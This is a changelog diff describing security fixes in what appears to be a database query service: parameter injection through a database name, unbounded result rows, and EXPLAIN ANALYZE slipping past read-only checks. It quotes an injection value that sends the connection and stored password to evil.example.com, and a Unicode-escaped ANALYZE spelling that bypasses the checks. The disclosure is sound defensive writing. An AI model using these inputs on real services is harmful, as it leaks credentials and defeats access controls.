@@ -1613,6 +1613,64 @@ project adheres to
   webhook `http_method` other than `GET`, `POST`, `PUT` or `PATCH` when
   a channel is created or updated. (#498)
 
+- Stop an optional database name from adding connection parameters of
+  its own choosing. The database override accepted by
+  `POST /api/v1/connections/{id}/query`, by the MCP tools that take a
+  `database_name` argument, and by a saved MCP session was pasted
+  straight into the connection string, so a name such as
+  `mydb?host=evil.example.com&sslmode=disable` ended the path and
+  appended libpq parameters, sending the connection, and the stored
+  password with it, to a host of the caller's choosing. The connection
+  string is now assembled with the URL builder, which escapes the path
+  and the query by construction, and a name that cannot name a real
+  database, being empty, longer than 63 bytes, or carrying a NUL or
+  another control character, is refused at all three call sites and
+  when a session's database selection is saved. Stored connections
+  themselves are unchanged, and a caller who could not already reach a
+  connection still cannot. (#530)
+
+- Bound the rows held in memory when a statement runs over the simple
+  query protocol, which is the path taken by an `EXPLAIN` containing a
+  `$1` placeholder. That path could not add a `LIMIT` clause, because it
+  sends the statement text unaltered, and it kept every row the server
+  returned, so a large result could exhaust the server's memory. Rows
+  past the same 500-row limit the ordinary path applies are now read but
+  not kept, and the response reports the result as truncated in the way
+  it already does elsewhere. The rest of the result is still read, so
+  the connection remains usable for the following statements in the
+  request. (#530)
+
+- Classify an `EXPLAIN` statement by the statement it explains, so that
+  `EXPLAIN ANALYZE` over a data-modifying statement goes through the
+  write-access check and the write-confirmation prompt.
+  `POST /api/v1/connections/{id}/query` previously classified any
+  statement whose text began with `EXPLAIN` as read-only without
+  looking at what was being explained, so `EXPLAIN ANALYZE` over a
+  `DELETE` ran without either of those guards and, where the statement
+  also contained something shaped like a `$1` placeholder, outside the
+  read-only transaction that the read path otherwise opens. That
+  defeated a connection scope of `read` on a token whose owner holds
+  `read_write`, and would equally defeat a plain read-only account. The
+  classification now follows the inner statement unless the option list
+  consists entirely of bare, recognized options that only change how the
+  plan is reported, so a quoted or Unicode-escaped spelling of
+  `ANALYZE`, such as `EXPLAIN (U&"\0061nalyze")`, no longer passes as
+  read-only. `SELECT ... INTO`, a row-locking `SELECT ... FOR UPDATE` or
+  `FOR SHARE`, and a `WITH` query containing `MERGE` are now classified
+  as writes as well, matching what a read-only transaction will accept.
+  The test for a `$N` placeholder now ignores one that appears inside a
+  quoted string, a dollar-quoted body or a comment, and understands the
+  `E'...'` and `U&'...'` literal forms, so an `EXPLAIN` over a query
+  containing a literal `$1` is no longer misrouted. The keyword scans
+  behind the classification likewise read code only, skipping quoted
+  strings, dollar-quoted bodies, quoted identifiers and comments, so a
+  keyword inside one no longer marks a read as a write, and a quote or
+  comment marker inside a dollar-quoted body no longer hides a write
+  that follows it. Statements that do
+  run over the simple query protocol are now held inside the same
+  read-only transaction as the rest of the read path. The fix needs no
+  restart beyond the upgrade itself and no database migration. (#530)
+
 - Fix a configuration file that omits
   `http.auth.max_failed_attempts_before_lockout` silently disabling
   account lockout. The setting was a plain integer, so an omitted key
